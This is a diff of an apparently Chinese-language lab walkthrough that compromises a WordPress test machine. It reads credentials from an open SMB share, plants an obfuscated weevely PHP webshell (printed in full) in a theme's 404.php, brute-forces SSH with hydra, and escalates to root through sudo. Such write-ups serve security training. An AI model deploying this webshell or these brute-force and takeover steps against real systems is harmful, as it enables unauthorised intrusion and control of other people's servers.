@@ -122,14 +122,8 @@
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl>                <span class=m>3029776</span> blocks of size 1024. <span class=m>1309832</span> blocks available
 </span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span>
-</span></span></code></pre></div><p>或者：
-<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20231209113736.png alt=image.png></p><p>进来后发现是网站的根目录，先翻找翻找有用的信息</p><p>在<code>smb://10.9.75.90/share$/wordpress/</code>目录下找到<code>wp-config.php</code>文件，查看一下
-<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20231209113946.png alt=image.png>
-找到 wordpress 的用户名：Admin 密码：TogieMYSQL12345^^</p><p>结合<code>dirb</code>扫描出来的<code>http://10.9.75.90/wordpress/wp-admin</code>地址，登录 wordpress 后台
-<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20231209114253.png alt=image.png>
-<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20231209114315.png alt=image.png></p><p>使用 weevely 工具，在 kali 中生成木马命令，在当前目录生成一个叫 GameOver.php 的文件密码为 feile</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>weevely generate feile ./GameOver.php
-</span></span></code></pre></div><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20231209142925.png alt=image.png></p><p>查看生成的 GameOver.php，将其内容复制到 wordpress 后台中
-<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20231209143009.png alt=image.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
+</span></span></code></pre></div><p>或者：</p><p><img src=img/20231209113736.png alt=image.png></p><p>进来后发现是网站的根目录，先翻找翻找有用的信息</p><p>在<code>smb://10.9.75.90/share$/wordpress/</code>目录下找到<code>wp-config.php</code>文件，查看一下</p><p><img src=img/20231209113946.png alt=image.png></p><p>找到 wordpress 的用户名：Admin 密码：TogieMYSQL12345^^</p><p>结合<code>dirb</code>扫描出来的<code>http://10.9.75.90/wordpress/wp-admin</code>地址，登录 wordpress 后台</p><p><img src=img/20231209114253.png alt=image.png></p><p><img src=img/20231209114315.png alt=image.png></p><p>使用 weevely 工具，在 kali 中生成木马命令，在当前目录生成一个叫 GameOver.php 的文件密码为 feile</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>weevely generate feile ./GameOver.php
+</span></span></code></pre></div><p><img src=img/20231209142925.png alt=image.png></p><p>查看生成的 GameOver.php，将其内容复制到 wordpress 后台中</p><p><img src=img/20231209143009.png alt=image.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
 </span></span><span class=line><span class=cl>$i=&#39;=b$j+=b+,=b$i++){$o.=$t{=b$i}^$k{$j};=b}}return =b$o;}=bi=bf (@preg_match=&#39;;
 </span></span><span class=line><span class=cl>d=&#39;e($=bm=b[1])=b,$k)));$o=@ob_get_contents=b();@ob=b_=be=bnd_clean();$r=@=bb&#39;;
 </span></span><span class=line><span class=cl>$y=&#39;ase=b64_encod=be(@x(@gzco=bmpre=bss($o)=b,$=bk))=b;print(&#34;=b$p$kh$r$kf&#34;);}&#39;;
@@ -142,10 +136,9 @@
 </span></span><span class=line><span class=cl>$o=str_replace(&#39;=b&#39;,&#39;&#39;,$B.$K.$h.$i.$F.$k.$d.$y);
 </span></span><span class=line><span class=cl>$m=$r(&#39;&#39;,$o);$m();
 </span></span><span class=line><span class=cl>?&gt;
-</span></span></code></pre></div><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20231209143138.png alt=image.png></p><p>在 kali 终端中访问</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>weevely http://10.9.75.90/wordpress/wp-content/themes/twentyfifteen/404.php feile
-</span></span></code></pre></div><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20231209143610.png alt=image.png>
-<strong>侵入成功！</strong></p><h6 id=2入侵思路二ssh-密码爆破>2）入侵思路二：ssh 密码爆破</h6><p>在<code>dirb</code>扫描中，发现网站页面中包含用户名
-<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20231209153557.png alt=image.png></p><p>尝试使用 hydra 对 ssh 爆破</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hydra -l togie -P top1000.txt ssh://10.9.75.90 -V
+</span></span></code></pre></div><p><img src=img/20231209143138.png alt=image.png></p><p>在 kali 终端中访问</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>weevely http://10.9.75.90/wordpress/wp-content/themes/twentyfifteen/404.php feile
+</span></span></code></pre></div><p><img src=img/20231209143610.png alt=image.png>
+<strong>侵入成功！</strong></p><h6 id=2入侵思路二ssh-密码爆破>2）入侵思路二：ssh 密码爆破</h6><p>在<code>dirb</code>扫描中，发现网站页面中包含用户名</p><p><img src=img/20231209153557.png alt=image.png></p><p>尝试使用 hydra 对 ssh 爆破</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hydra -l togie -P top1000.txt ssh://10.9.75.90 -V
 </span></span></code></pre></div><p>得到密码：12345</p><p>进行 ssh 连接</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh togie@10.9.75.90
 </span></span></code></pre></div><p><strong>连接成功！</strong></p><p>先查看用户权限</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo -l
 </span></span></code></pre></div><p>发现是<code>(ALL : ALL) ALL</code>，直接<code>sudo passwd root</code>或者<code>sudo -i</code>提权</p></div><div class=post_footer><div class=meta><div class=info><span class="field tags"><i class=ri-stack-line></i>
